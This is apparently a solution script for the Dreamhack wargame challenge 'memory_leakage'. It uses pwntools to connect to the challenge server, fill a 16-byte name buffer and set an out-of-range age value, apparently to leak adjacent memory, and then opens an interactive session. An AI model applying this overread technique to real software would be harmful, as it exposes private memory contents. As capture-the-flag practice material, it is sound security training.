from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/memory_leakage')
else:
    r = remote('host1.dreamhack.games', 21779)

sla = r.sendlineafter
sa = r.sendafter

sla('> ', '1')
sa('Name: ', 'a' * 16)
sla('Age: ', str(0xffffffff))

sla('> ', '3')
sla('> ', '2')

r.interactive()